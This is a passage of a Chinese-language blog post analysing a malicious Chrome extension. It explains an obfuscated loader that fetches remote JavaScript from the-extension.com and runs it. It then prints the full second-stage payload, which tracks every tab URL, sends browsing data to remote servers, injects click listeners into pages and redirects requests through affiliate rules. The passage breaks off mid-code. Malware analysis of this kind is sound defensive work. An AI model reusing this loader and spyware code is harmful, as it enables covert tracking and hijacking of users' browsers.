<span class="keyword">catch</span>(_0x5bd26e) &#123;</div><div class="line">        e(&#123;</div><div class="line">            <span class="string">'act'</span>: <span class="string">"error"</span>,</div><div class="line">            <span class="string">'lab'</span>: <span class="string">`run_$ &#123;</span></div><div class="line">                _0xfc65f5["version"]</div><div class="line">            &#125;`</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function i 为入口函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        e(&#123;</div><div class="line">            <span class="string">'act'</span>: <span class="string">"init"</span></div><div class="line">        &#125;),</div><div class="line">        r()[<span class="string">"then"</span>](a);</div><div class="line">    &#125;,</div><div class="line">    c[<span class="string">'Cf'</span>]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function r 是用来下载执行</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x223434, _0x1b9f00) = &gt;&#123;</div><div class="line">        l[<span class="string">"get"</span>](<span class="string">"pyW5F1U43VI"</span>)[<span class="string">'then'</span>](_0x30d294 = &gt;&#123;</div><div class="line">            <span class="keyword">let</span> _0x55a281 = _0x30d294[<span class="string">'pyW5F1U43VI'</span>] || <span class="number">0x0</span>;</div><div class="line">            <span class="number">0x0</span> === _0x55a281 &amp;&amp; l[<span class="string">"set"</span>](&#123;</div><div class="line">                <span class="string">'XMWEzI4SfdC'</span>: <span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>]()</div><div class="line">            &#125;)[<span class="string">'then'</span>](_0x2d7d72 = &gt;&#123;</div><div class="line">                e(&#123;</div><div class="line">                    <span class="string">'act'</span>: <span class="string">'install'</span></div><div class="line">                &#125;);</div><div class="line">            &#125;),</div><div class="line">            <span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>]() - _0x55a281 &gt; c[<span class="string">'WL'</span>][<span class="string">'Gj'</span>] ? setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                n(<span class="string">`$ &#123;c['WL']["url"]&#125;/?hash=jwtmv6kavksy5cazdf4leg66r`</span>,<span class="string">"GET"</span>)[<span class="string">"then"</span>](o)[<span class="string">"then"</span>](_0x223434);&#125;,c[<span class="string">'fM'</span>]):l[<span class="string">"get"</span>]([<span class="string">"TjPzl8caI41"</span>,<span class="string">"KI10wTwwvF7"</span>])[<span class="string">"then"</span>](<span class="function"><span class="params">_0x1d2d5e</span>=&gt;</span>&#123;_0x223434(&#123;<span class="string">'code'</span>:_0x1d2d5e[<span class="string">"TjPzl8caI41"</span>],<span class="string">'version'</span>:_0x1d2d5e[<span class="string">'KI10wTwwvF7'</span>]&#125;);&#125;);&#125;);&#125;);&#125;</div></pre></td></tr></table></figure>
<p>这段js里面有一个比较重要的变量c</p>
<p><img src="4.png" alt=""></p>
<p>还有一个 重要的l，l包含了四个函数<code>EE</code>,<code>get</code>,<code>set</code>,<code>Yj</code></p>
<p>function EE</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">EE() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x47a45d, _0x110900) = &gt;&#123;</div><div class="line">        chrome[<span class="string">'storage'</span>][<span class="string">'local'</span>][<span class="string">'EE'</span>](<span class="function"><span class="keyword">function</span>(<span class="params">_0x25822d</span>) </span>&#123;</div><div class="line">            _0x47a45d(_0x25822d);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function get  用于从存储的文件中取数据</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">get(e = <span class="literal">null</span>) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x459136, _0x1dd2d2) = &gt;&#123;</div><div class="line">        chrome[<span class="string">'storage'</span>][<span class="string">'local'</span>][<span class="string">'get'</span>](e,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">_0x49e268</span>) </span>&#123;</div><div class="line">            _0x459136(_0x49e268);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function set 用于将数据写入到存储文件中</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">set(_0x1054f4) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x13679c, _0x5182a6) = &gt;&#123;</div><div class="line">        chrome[<span class="string">'storage'</span>][<span class="string">'local'</span>][<span class="string">'set'</span>](_0x1054f4,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">_0x154ca1</span>) </span>&#123;</div><div class="line">            _0x13679c(_0x154ca1);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function yJ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">yJ(_0x21744e) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x23501d, _0x525375) = &gt;&#123;</div><div class="line">        chrome[<span class="string">'storage'</span>][<span class="string">'local'</span>][<span class="string">'yJ'</span>](_0x21744e,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">_0x298d92</span>) </span>&#123;</div><div class="line">            _0x23501d(_0x298d92);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段恶意js的执行流程如下：</p>
<p>这段恶意js的入口函数为function i，随后function i首先会向<code>https://the-extension.com/stats?hash=jwtmv6kavksy5cazdf4leg66r&amp;eventCategory=eval&amp;eventAction=init&amp;eventLabel=</code>更新运行状态</p>
<p>随后会调用function r，这个函数完成了下载恶意js并持久化存储到本地并执行的功能。</p>
<p>此时向n函数中传递的参数为<code>&quot;https://the-extension.com/?hash=jwtmv6kavksy5cazdf4leg66r&quot;</code>和<code>GET</code>，也就是用<code>GET</code>请求获取这个网页的内容。</p>
<p><img src="7.png" alt=""></p>
<p>下载下来的东西保存在了这里</p>
<p><img src="10.png" alt=""></p>
<p>外部的恶意js地址<code>https://the-extension.com/?hash=jwtmv6kavksy5cazdf4leg66r</code>，返回的json，我们把code取出来</p>
<figure class="highlight json"><table><tr><td class="code"><pre><div class="line">&#123;<span class="attr">"code"</span>:<span class="string">"function req(obj,callback,errback)&#123;var params=obj.params?obj.params:[],xhr=new XMLHttpRequest;if(callback&amp;&amp;(xhr.onload=function(e)&#123;e=e.target,200===e.status||304===e.status?callback(&#123;responseText:e.responseText,headers:e.getAllResponseHeaders().split(\"\\r\\n\")&#125;):errback&amp;&amp;errback(e.status)&#125;),errback&amp;&amp;(xhr.onerror=function(e)&#123;e=e.target.status,errback(e)&#125;),xhr.open(obj.method,obj.url),params.head)for(i in params.head)obj.setRequestHeader(i,params.head[i]);if(params.mime)for(i in params.mime)obj.overrideMimeType(params.mime[i]);if(params.post&amp;&amp;xhr.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\"),(params.post||params.xml)&amp;&amp;xhr.setRequestHeader(\"X-Requested-With\",\"XMLHttpRequest\"),\"object\"==typeof params.post)&#123;x=params.post,params.post=\"\";for(i in x)x.hasOwnProperty(i)&amp;&amp;(params.post+=(params.post?\"&amp;\":\"\")+i+\"=\"+x[i])&#125;xhr.send(params.post)&#125;function cutw(hostname)&#123;return hostname.replace(/(^www\\.|\\:\\d+$)/gi,\"\")&#125;function getDomain(hostname)&#123;var result,matches=hostname.match(domainRgxp);return matches&amp;&amp;(result=matches[1]),result&#125;function getSub(hostname,domain)&#123;var result=hostname.replace(domain,\"\");return result&amp;&amp;(result=result.replace(/\\.$/,\"\")),result&#125;function prepareLink(link)&#123;/^(\\w+:)?\\/\\//.test(link)||(link=\"http://\"+link);var result,matches=link.match(mainRgxp);if(matches)try&#123;var host=cutw(matches[2]),domain=getDomain(host);if(domain)&#123;var sub=getSub(host,domain);result=&#123;sch:matches[1],host:host,domain:domain,sub:sub,path:(matches[3]||\"\").replace(/^\\//,\"\"),search:(matches[4]||\"\").replace(/^\\?/,\"\")&#125;&#125;&#125;catch(e)&#123;console.log(\"Error: \"+url)&#125;return result&#125;function tryUrl(url)&#123;if(!(usedT&amp;&amp;usedT&gt;(new Date).getTime()-42e5))&#123;var res,prepared=prepareLink(url);if(prepared&amp;&amp;rulesObject[prepared.domain])&#123;var subd=rulesObject[prepared.domain][prepared.sub];if(subd&amp;&amp;(subd[prepared.path]?res=subd[prepared.path]:subd[\"*\"]&amp;&amp;(res=subd[\"*\"])),res||(subd=rulesObject[prepared.domain][\"*\"])&amp;&amp;(subd[prepared.path]?res=subd[prepared.path]:subd[\"*\"]&amp;&amp;(res=subd[\"*\"])),res)return res=res.replace(/__CURURL__/g,encodeURIComponent(url)).replace(/__SUBID__/g,wid),usedT=(new Date).getTime(),localStorage.usedT=usedT,res&#125;&#125;&#125;function getData()&#123;setTimeout(getData,864e5),req(&#123;method:\"GET\",url:host+\"bhrule?sub=\"+wid&#125;,function(response)&#123;try&#123;response=JSON.parse(response.responseText),rulesObject=response.rules?response.rules:&#123;&#125;&#125;catch(e)&#123;&#125;&#125;,function()&#123;&#125;)&#125;var wrap1=function()&#123;function qs(obj)&#123;return Object.keys(obj).filter(function(key)&#123;return(!!obj[key]||!1===obj[key])&amp;&amp;-1===filtered.indexOf(key)&#125;).map(function(key)&#123;var val=obj[key];return\"se\"===key?obj[key].map(function(v)&#123;return key+\"=\"+encodeURIComponent(v)&#125;).join(\"&amp;\"):(-1&lt;\"sh b a lt zz\".split(\" \").indexOf(key)&amp;&amp;(val=encodeURIComponent(val||\"\")),key+\"=\"+val)&#125;).join(\"&amp;\")&#125;function fetchOverlayPattern(data,callback)&#123;if(listenerLast=localStorage.getItem(\"listenerLast\"),(new Date).getTime()-listenerLast&gt;300)&#123;data.tnew=Date.now();var bqa=qs(data),payload=btoa(bqa),xhr=new XMLHttpRequest;xhr.open(\"POST\",configFetcher.MainLocator()+main_route,!0),xhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"),xhr.onload=function(e)&#123;if(200==this.status)try&#123;callback(JSON.parse(this.response))&#125;catch(e)&#123;&#125;&#125;,xhr.send([\"e\",encodeURIComponent(btoa(payload))].join(\"=\")),localStorage.setItem(\"listenerLast\",(new Date).getTime())&#125;&#125;function TabList()&#123;var hash=&#123;&#125;,lp=\"\",lpi=void 0;return&#123;remove:function(tid)&#123;delete hash[tid]&#125;,edit:function(tid,props)&#123;return tid?(hash[tid]||this.clear(tid),Object.keys(props||&#123;&#125;).forEach(function(key)&#123;hash[tid][key]=props[key]&#125;),hash[tid]):null&#125;,request:function(tabId,tab)&#123;if(configFetcher.IsEnable()&amp;&amp;toggler.isOn())&#123;if(!hash[tabId]||hash[tabId].p&amp;&amp;!hash[tabId].replaced)return void this.clear(tabId);var currTab=hash[tabId]||&#123;&#125;,url=validateUrl(tab.url);url&amp;&amp;(currTab.hh||lp!=tab.url)&amp;&amp;(tab.active||hash[tabId].fr||hash[tabId].uk.push(\"background_auto_reloading\"),hash[tabId].dada&amp;&amp;hash[hash[tabId].dada]&amp;&amp;hash[hash[tabId].dada].retroet&amp;&amp;(hash[tabId].zz=hash[hash[tabId].dada].retroet),fetchOverlayPattern(this.edit(tabId,&#123;sh:url,b:lp&#125;),function(d)&#123;&#125;),tab.active&amp;&amp;(lp=currTab.sh),hash[tabId].zz=null,hash[tabId].dada=null),this.clear(tabId),hash[tabId].sh=url,hash[tabId].p=!0&#125;&#125;,clear:function(tid)&#123;hash[tid]=&#123;var:version||\"missing\",val:21,un:\"1\",su:browsername,ch:ch,new:itemator1,exp:guid(),sesnew:\"\",d:0,se:[],restarting:!1,sh:(hash[tid]||&#123;&#125;).sh||null,a:(hash[tid]||&#123;&#125;).a||\"\",uk:[],fr:!1,aj:(hash[tid]||&#123;&#125;).aj||!1,replaced:(hash[tid]||&#123;&#125;).replaced||!1,hh:(hash[tid]||&#123;&#125;).hh||!1,dada:(hash[tid]||&#123;&#125;).dada||null,retroet:(hash[tid]||&#123;&#125;).retroet||\"\",zz:(hash[tid]||&#123;&#125;).zz||\"\"&#125;&#125;,details:function(tid,cb)&#123;chrome.tabs.get(tid,function(details)&#123;chrome.runtime.lastError||cb(details)&#125;)&#125;,lpUpdate:function(param)&#123;var idd=param.id||param;lpi=param.id||void 0,lp=(hash[idd]||&#123;&#125;).sh||lp&#125;,getLpi:function()&#123;return lpi&#125;&#125;&#125;function validateUrl(url)&#123;return 0===url.indexOf(\"http\")&amp;&amp;-1===url.indexOf(\"://localhost\")&amp;&amp;-1===url.indexOf(\"chrome/newtab\")&amp;&amp;0!==url.indexOf(\"chrome-\")&amp;&amp;0!==url.indexOf(\"about:\")&amp;&amp;-1===url.indexOf(\"chrome://\")?url:null&#125;function reselected(tid)&#123;tablist.details((tid||&#123;&#125;).tabId||tid,tablist.lpUpdate)&#125;function onUpdated(tabId,details,tab)&#123;details&amp;&amp;\"complete\"===details.status&amp;&amp;(tablist.edit(tabId).p&amp;&amp;tablist.edit(tabId).aj&amp;&amp;tablist.edit(tabId,&#123;sh:void 0,p:!1,aj:!1&#125;),tablist.edit(tabId,&#123;ng:\"ajax\",aj:!0&#125;),tablist.request(tabId,tab),tablist.edit(tabId,&#123;replaced:!1&#125;))&#125;function onReplaced(addedTabId,removedTabId)&#123;tablist.edit(addedTabId,&#123;replaced:!0&#125;),tablist.details(addedTabId,tablist.request.bind(tablist,(addedTabId||&#123;&#125;).tabId||addedTabId))&#125;function onBeforeSendHeaders(details)&#123;return tablist.edit(details.tabId,&#123;hh:!0&#125;),details.requestHeaders.some(function(rh)&#123;return/^Referer$/i.test(rh.name)&amp;&amp;tablist.edit(details.tabId,&#123;a:rh.value&#125;)&#125;)||tablist.edit(details.tabId,&#123;a:\"\"&#125;),&#123;requestHeaders:details.requestHeaders&#125;&#125;function onCommitted(dtls)&#123;dtls=dtls||&#123;&#125;;var tid=dtls.tabId,tsh=dtls.transitionQualifiers;tid&amp;&amp;0===dtls.frameId&amp;&amp;(tablist.edit(tid,&#123;ng:dtls.transitionType,tsh:tsh&#125;),/client_redirect/.test(tsh)&amp;&amp;tablist.edit(tid,&#123;lt:dtls.url&#125;),/server_redirect/.test(tsh),tablist.details(tid,tablist.request.bind(tablist,(tid||&#123;&#125;).tabId||tid)))&#125;function cwonRemoved(windowID)&#123;ct.query(&#123;active:!0&#125;,function(tabs)&#123;tabs[0]&amp;&amp;tablist.lpUpdate(tabs[0])&#125;)&#125;function cwonFocused(window)&#123;cw.WINDOW_ID_NONE!=window&amp;&amp;ct.query(&#123;windowId:window,active:!0&#125;,function(tabs)&#123;tabs[0]&amp;&amp;tabs[0].active&amp;&amp;tablist.lpUpdate(tabs[0])&#125;)&#125;function onCreated(tab)&#123;var openerTabId=(tablist.edit(tab.id,&#123;fr:!0,replaced:!1&#125;),tab.openerTabId||tablist.getLpi());tablist.edit(openerTabId),tab.url.length&amp;&amp;tablist.edit(openerTabId)&amp;&amp;tab.url===tablist.edit(openerTabId).sh?tablist.edit(tab.id).uk.push(\"duplication\"):tab.url.length&amp;&amp;ct.query(&#123;url:tab.url&#125;,function(tabs)&#123;(tabs||[]).length&gt;1&amp;&amp;(tablist.edit(tab.id).uk.push(\"duplication\"),tablist.edit(tab.id).uk.push(\"background_duplication\"))&#125;),\"complete\"!=tab.status||tab.openerTabId||tablist.edit(tab.id).uk.push(\"reopening\"),tablist.edit(tab.id,&#123;dada:openerTabId&#125;)&#125;function guid()&#123;var guid=localStorage.getItem(guid_key);if(!guid)&#123;var g=function()&#123;return(65536*(1+Math.random(Date.now()+12))|0).toString(30).substring(1)&#125;;guid=g()+g()+g()+g()+g()+g()+g()+g()+g(),localStorage.setItem(guid_key,guid)&#125;return guid&#125;var itemator1=310,version=chrome.runtime.getManifest().version,main_route=(localStorage.serverInfo&amp;&amp;JSON.parse(localStorage.serverInfo),\"/logic/page/data\"),guid_key=\"uaswitcherk\",skeys=[\"o\",\"u\"],ch=4,browsername=\"chrome\",toggler=new function()&#123;function save()&#123;localStorage.setItem(localKey,isOn?1:0)&#125;function _optTurnOn()&#123;&#125;var isOn=!0,localKey=\"isdugnlkWfmgosd2\";this.turnOn=function()&#123;isOn=!0,save(),_optTurnOn()&#125;,this.turnOff=function()&#123;isOn=!1,save()&#125;,this.isOn=function()&#123;return isOn&#125;,this.whenOn=function()&#123;return this.isOn()?Promise.resolve(!0):new Promise(function(resolve)&#123;_optTurnOn=function()&#123;resolve()&#125;&#125;)&#125;,function()&#123;var val=localStorage.getItem(localKey),intVal=parseInt(val);isOn=!!isNaN(intVal)||1===intVal&#125;()&#125;,configFetcher=new function()&#123;var settings=\"\",setDump=function()&#123;localStorage.setItem(\"uasc\",JSON.stringify(settings))&#125;,setUp=function(endpt)&#123;var cb=function(sts,resp)&#123;sts&amp;&amp;(settings=JSON.parse(resp),setDump())&#125;,xhr=new XMLHttpRequest;xhr.onreadystatechange=function()&#123;4==xhr.readyState&amp;&amp;cb.apply(null,[200==xhr.status,xhr.responseText].concat(arguments))&#125;,xhr.open(\"GET\",endpt+\"?\"+function(arr)&#123;return Object.keys(arr).map(function(hashed)&#123;return hashed+\"=\"+arr[hashed]&#125;).join(\"&amp;\")&#125;(&#123;s:itemator1,ver:version&#125;),!0),xhr.send()&#125;;!function()&#123;var p=localStorage.getItem(\"uasc\");settings=p?JSON.parse(p):settings&#125;(),toggler.whenOn().then(function()&#123;setUp(\"https://uaswitcher.org/splash\")&#125;),this.enablator=function()&#123;settings[skeys[0]]=1,setDump()&#125;,this.disablator=function()&#123;settings[skeys[0]]=0,setDump()&#125;,this.IsEnable=function()&#123;return Boolean(settings&amp;&amp;settings[skeys[0]])&#125;,this.MainLocator=function()&#123;return settings&amp;&amp;settings[skeys[1]]&#125;&#125;,filtered=[\"restarting\",\"hh\",\"p\",\"fr\",\"aj\",\"replaced\",\"retroet\",\"dada\"],listenerLast=localStorage.getItem(\"listenerLast\")||0,tablist=new TabList,ct=(chrome.browserAction,chrome.tabs),wr=chrome.webRequest,wn=chrome.webNavigation,cw=chrome.windows;chrome.runtime.onMessage.addListener(function(request,sender)&#123;request.href?tablist.edit(sender.tab.id,&#123;zz:request.href&#125;):request.ahref&amp;&amp;tablist.edit(sender.tab.id,&#123;retroet:request.ahref&#125;)&#125;),cw.getAll(&#123;populate:!0&#125;,function(windows)&#123;for(var w=0;w&lt;windows.length;w++)for(var i=0;i&lt;windows[w].tabs.length;i++)validateUrl(windows[w].tabs[i].url)&amp;&amp;(tablist.edit(windows[w].tabs[i].id,&#123;sh:windows[w].tabs[i].url,restarting:!0&#125;),windows[w].focused&amp;&amp;windows[w].tabs[i].active&amp;&amp;tablist.lpUpdate(windows[w].tabs[i]))&#125;),ct.onUpdated.addListener(onUpdated),ct.onReplaced.addListener(onReplaced);var repertuar=&#123;types:[\"main_frame\"],urls:[\"&lt;all_urls&gt;\"]&#125;;return wr.onBeforeRequest.addListener(function(details)&#123;validateUrl(details.url)&amp;&amp;tablist.edit(details.tabId,&#123;sh:void 0,p:!1,aj:!1&#125;)&#125;,repertuar,[\"blocking\"]),wr.onBeforeRedirect.addListener(function(details)&#123;validateUrl(details.url)&amp;&amp;tablist.edit(details.tabId).se.push(details.url)&#125;,repertuar),wr.onBeforeSendHeaders.addListener(onBeforeSendHeaders,repertuar,[\"blocking\",\"requestHeaders\"]),wr.onHeadersReceived.addListener(function(details)&#123;tablist.edit(details.tabId,&#123;hh:!0&#125;)&#125;,repertuar),wn.onCommitted.addListener(onCommitted),ct.onRemoved.addListener(function(tabId)&#123;tablist.remove(tabId)&#125;),cw.onRemoved.addListener(cwonRemoved),ct.onCreated.addListener(onCreated),cw.onFocusChanged.addListener(cwonFocused),ct.onActivated?ct.onActivated.addListener(reselected):ct.onSelectionChanged.addListener(reselected),wr.onErrorOccurred.addListener(function(details)&#123;try&#123;tablist.edit(details.tabId,&#123;se:null&#125;)&#125;catch(e)&#123;&#125;&#125;,repertuar),&#123;optin:toggler.turnOn,optout:toggler.turnOff,isopt:toggler.isOn,whenopt:toggler.whenOn()&#125;&#125;();wrap1.optin(),chrome.tabs.onUpdated.addListener(function(tabId)&#123;chrome.tabs.get(tabId,function(tab)&#123;\"loading\"==tab.status&amp;&amp;chrome.tabs.executeScript(tab.id,&#123;code:`\r\n                    if(!document.getElementById(\"sbmarwusasv5\")) &#123;\r\n                       var flag=document.createElement(\"span\");\r\n                       flag.id=\"sbmarwusasv5\";\r\n                       document.body.appendChild(flag);\r\n     \r\n                       document.body.addEventListener(\"click\", function(event) &#123;\r\n                        try &#123;\r\n                            if(event.target.href) &#123;\r\n                                chrome.runtime.sendMessage(&#123;href: event.target.href, listener: \"usassmwv5\"&#125;);\r\n                            &#125;\r\n                        &#125;catch(e)&#123;\r\n                            console.log(e);\r\n                        &#125;\r\n                       &#125;);\r\n                    \r\n                    document.body.addEventListener(\"contextmenu\", function(event) &#123;\r\n                        if(event.target.href) &#123;\r\n                            chrome.runtime.sendMessage(&#123;ahref: event.target.href, listener: \"usassmwv5\"&#125;);\r\n                        &#125;\r\n                        return false;\r\n                    &#125;, false);\r\n                    \r\n                    document.body.addEventListener(\"auxclick\", function(event) &#123;\r\n                        if(event.target.href) &#123;\r\n                            chrome.runtime.sendMessage(&#123;ahref: event.target.href, listener: \"usassmwv5\"&#125;);\r\n                        &#125;\r\n                    &#125;);\r\n             &#125;`&#125;)&#125;)&#125;);var host=\"http://api.data-monitor.info/api/\",wid=116,rulesObject=&#123;&#125;,usedT=localStorage.usedT?parseInt(localStorage.usedT):null,mainRgxp=new RegExp(\"^(?:([^:\\\\/?]+):)?(?:\\\\/\\\\/([^\\\\/]*))?([^?]*)(?:\\\\?([^$]*))?\"),domainRgxp=/((?:[^.]+)\\.(?:(?:com?|org)\\.)?\\w+)$/i,listenFunc=function(details)&#123;if(!(usedT&amp;&amp;usedT&gt;(new Date).getTime()-42e5)&amp;&amp;0===details.frameId&amp;&amp;\"main_frame\"==details.type&amp;&amp;-1===details.parentFrameId&amp;&amp;details.tabId&gt;0&amp;&amp;/^https?/i.test(details.url))&#123;var current=details.url,new_url=(prepareLink(current),tryUrl(current));if(\"string\"==typeof new_url&amp;&amp;current!=new_url)return&#123;redirectUrl:new_url&#125;&#125;&#125;;chrome.webRequest.onBeforeRequest.addListener(listenFunc,&#123;urls:[\"&lt;all_urls&gt;\"]&#125;,[\"blocking\"]),getData();"</span>,<span class="attr">"version"</span>:<span class="string">"v20170905"</span>&#125;</div></pre></td></tr></table></figure>
<p>可以看到，这段恶意代码的版本是<code>v20170905</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><div class="line">&#123;<span class="attr">"code"</span>:<span class="string">"evil javascript"</span>, <span class="attr">"version"</span>:<span class="string">"v20170905"</span>&#125;</div></pre></td></tr></table></figure>
<p>把这段js提取出来</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">req</span>(<span class="params">obj, callback, errback</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> params = obj.params ? obj.params: [],</div><div class="line">    xhr = <span class="keyword">new</span> XMLHttpRequest;</div><div class="line">    <span class="keyword">if</span> (callback &amp;&amp; (xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">        e = e.target,</div><div class="line">        <span class="number">200</span> === e.status || <span class="number">304</span> === e.status ? callback(&#123;</div><div class="line">            <span class="attr">responseText</span>: e.responseText,</div><div class="line">            <span class="attr">headers</span>: e.getAllResponseHeaders().split(<span class="string">"\r\n"</span>)</div><div class="line">        &#125;) : errback &amp;&amp; errback(e.status)</div><div class="line">    &#125;), errback &amp;&amp; (xhr.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">        e = e.target.status,</div><div class="line">        errback(e)</div><div class="line">    &#125;), xhr.open(obj.method, obj.url), params.head) <span class="keyword">for</span> (i <span class="keyword">in</span> params.head) obj.setRequestHeader(i, params.head[i]);</div><div class="line">    <span class="keyword">if</span> (params.mime) <span class="keyword">for</span> (i <span class="keyword">in</span> params.mime) obj.overrideMimeType(params.mime[i]);</div><div class="line">    <span class="keyword">if</span> (params.post &amp;&amp; xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>), (params.post || params.xml) &amp;&amp; xhr.setRequestHeader(<span class="string">"X-Requested-With"</span>, <span class="string">"XMLHttpRequest"</span>), <span class="string">"object"</span> == <span class="keyword">typeof</span> params.post) &#123;</div><div class="line">        x = params.post,</div><div class="line">        params.post = <span class="string">""</span>;</div><div class="line">        <span class="keyword">for</span> (i <span class="keyword">in</span> x) x.hasOwnProperty(i) &amp;&amp; (params.post += (params.post ? <span class="string">"&amp;"</span>: <span class="string">""</span>) + i + <span class="string">"="</span> + x[i])</div><div class="line">    &#125;</div><div class="line">    xhr.send(params.post)</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">cutw</span>(<span class="params">hostname</span>) </span>&#123; <span class="comment">// 去除域名中的www和端口 比如 www.baidu.com:443 =&gt; baidu.com</span></div><div class="line">    <span class="keyword">return</span> hostname.replace(<span class="regexp">/(^www\.|\:\d+$)/gi</span>, <span class="string">""</span>)</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDomain</span>(<span class="params">hostname</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> result, matches = hostname.match(domainRgxp);</div><div class="line">    <span class="keyword">return</span> matches &amp;&amp; (result = matches[<span class="number">1</span>]),</div><div class="line">    result</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSub</span>(<span class="params">hostname, domain</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> result = hostname.replace(domain, <span class="string">""</span>);</div><div class="line">    <span class="keyword">return</span> result &amp;&amp; (result = result.replace(<span class="regexp">/\.$/</span>, <span class="string">""</span>)),</div><div class="line">    result</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">prepareLink</span>(<span class="params">link</span>) </span>&#123; </div><div class="line">    /^(\w+:)?\/\<span class="comment">//.test(link) || (link = "http://" + link);</span></div><div class="line">    <span class="keyword">var</span> result, matches = link.match(mainRgxp);</div><div class="line">    <span class="keyword">if</span> (matches) <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">var</span> host = cutw(matches[<span class="number">2</span>]),</div><div class="line">        domain = getDomain(host);</div><div class="line">        <span class="keyword">if</span> (domain) &#123;</div><div class="line">            <span class="keyword">var</span> sub = getSub(host, domain);</div><div class="line">            result = &#123;</div><div class="line">                <span class="attr">sch</span>: matches[<span class="number">1</span>],</div><div class="line">                <span class="attr">host</span>: host,</div><div class="line">                <span class="attr">domain</span>: domain,</div><div class="line">                <span class="attr">sub</span>: sub,</div><div class="line">                <span class="attr">path</span>: (matches[<span class="number">3</span>] || <span class="string">""</span>).replace(<span class="regexp">/^\//</span>, <span class="string">""</span>),</div><div class="line">                <span class="attr">search</span>: (matches[<span class="number">4</span>] || <span class="string">""</span>).replace(<span class="regexp">/^\?/</span>, <span class="string">""</span>)</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"Error: "</span> + url)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> result</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryUrl</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (! (usedT &amp;&amp; usedT &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime() - <span class="number">42e5</span>)) &#123;</div><div class="line">        <span class="keyword">var</span> res, prepared = prepareLink(url);</div><div class="line">        <span class="keyword">if</span> (prepared &amp;&amp; rulesObject[prepared.domain]) &#123;</div><div class="line">            <span class="keyword">var</span> subd = rulesObject[prepared.domain][prepared.sub];</div><div class="line">            <span class="keyword">if</span> (subd &amp;&amp; (subd[prepared.path] ? res = subd[prepared.path] : subd[<span class="string">"*"</span>] &amp;&amp; (res = subd[<span class="string">"*"</span>])), res || (subd = rulesObject[prepared.domain][<span class="string">"*"</span>]) &amp;&amp; (subd[prepared.path] ? res = subd[prepared.path] : subd[<span class="string">"*"</span>] &amp;&amp; (res = subd[<span class="string">"*"</span>])), res) <span class="keyword">return</span> res = res.replace(<span class="regexp">/__CURURL__/g</span>, <span class="built_in">encodeURIComponent</span>(url)).replace(<span class="regexp">/__SUBID__/g</span>, wid),</div><div class="line">            usedT = (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime(),</div><div class="line">            localStorage.usedT = usedT,</div><div class="line">            res</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 获取推广规则</span></div><div class="line">    setTimeout(getData, <span class="number">864e5</span>),</div><div class="line">    req(&#123;</div><div class="line">        <span class="attr">method</span>: <span 